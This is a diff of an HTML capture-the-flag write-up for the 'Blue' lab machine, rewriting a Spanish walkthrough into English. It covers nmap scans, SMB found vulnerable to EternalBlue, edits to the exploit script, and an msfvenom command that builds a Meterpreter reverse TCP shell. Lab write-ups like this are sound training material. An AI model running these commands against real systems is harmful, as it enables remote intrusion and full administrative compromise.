@@ -7,6 +7,66 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>Blue</h1><br/><p><ol><li>Realizamos un escaneo de puertos con nmap</br><strong> nmap -Pn -sV -sC -p- --open 10.10.10.40 -oN scan.txt</strong></li><li>Encontramos Windows Server y SMB abiertos</li><li>Intento entrar con el usuario anonymous pero no encuentro nada.</li><br>realizo un nmap con el parametro <strong> --script vuln</strong></br><strong> nmap -Pn -sV -sC -p- --open 10.10.10.40 --script vuln</strong></li><li>La script encuentra que SMB es vulnerable a EternalBlue</li></ol></p><p>  <img src="images/25-1.png" alt="images/25-1.png" /><ol><li>Al  ejecutar la script dme da un error de que no se encontró la pipe</li><li>Creo que es un problema de privilegios</li><li>Tengo que modificar la script</li><li>Primero meto el usuario</li></ol></p><p>  <img src="images/25-2.png" alt="images/25-2.png" /><ol><li>Este script lo que hace es crear un archivo. Pero no nos va a devolver un shell</li><li>Leyendo el código encuentro esto</li></ol></p><p>  <img src="images/25-3.png" alt="images/25-3.png" /><ol><li>Creo un reverse shell con msfvenom<strong> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o reverse.exe</strong></li><li>Descomentamos en la script y metemos el path de reverse.exe</li><li>Lo ejecutamos y tenemos el shell</li><li>Otra opción sería con msfconsole </li></ol><img src="images/25-4.png" alt="images/25-4.png" /><ol><li>EternalBlue nos permite entrar como administradores directamente</li></ol></p></div>
+<div class="page">
+<h1 class="title">Blue</h1>
+
+<section>
+<h2>Reconnaissance</h2>
+<p>
+The first step was performing a full port scan against the target host to identify exposed services. An aggressive Nmap scan was executed, including default scripts and service version detection.
+</p>
+<pre><code>nmap -Pn -sV -sC -p- --open 10.10.10.40 -oN scan.txt</code></pre>
+<p>
+The results revealed a Windows Server system with SMB services available. An attempt was made to access the SMB service using the anonymous user, but no useful information was retrieved.
+</p>
+<p>
+To further assess potential vulnerabilities, an additional Nmap scan was performed using the vulnerability detection scripts.
+</p>
+<pre><code>nmap -Pn -sV -sC -p- --open 10.10.10.40 --script vuln</code></pre>
+<p>
+This scan indicated that the SMB service was vulnerable to the well-known EternalBlue vulnerability.
+</p>
+<img src="images/25-1.png" alt="images/25-1.png" />
+</section>
+
+<section>
+<h2>Enumeration / Analysis</h2>
+<p>
+When executing the provided EternalBlue exploit script, an error was encountered indicating that the required named pipe could not be found. This behavior suggested a privilege-related issue within the script execution.
+</p>
+<p>
+In order to resolve this, the exploit script was reviewed and modified. The first adjustment consisted of explicitly defining the user within the script to ensure proper access.
+</p>
+<img src="images/25-2.png" alt="images/25-2.png" />
+<p>
+Further analysis of the script revealed that its current behavior was limited to creating a file on the target system, without returning an interactive shell.
+</p>
+<img src="images/25-3.png" alt="images/25-3.png" />
+</section>
+
+<section>
+<h2>Exploitation</h2>
+<p>
+To gain an interactive session, a custom reverse shell payload was generated using msfvenom. The payload was configured to establish a Meterpreter reverse TCP connection.
+</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o reverse.exe</code></pre>
+<p>
+The exploit script was then modified by uncommenting the relevant section and specifying the full path to the generated reverse shell executable.
+</p>
+<p>
+After executing the modified script, a successful reverse shell was obtained. As an alternative approach, exploitation could also be performed directly through Metasploit using msfconsole.
+</p>
+<img src="images/25-4.png" alt="images/25-4.png" />
+</section>
+
+<section>
+<h2>Privilege Escalation</h2>
+<p>
+Due to the nature of the EternalBlue vulnerability, successful exploitation grants immediate administrative privileges on the target system, completing the compromise without the need for additional privilege escalation techniques.
+</p>
+</section>
+
+</div>
 </body>
+
 </html>
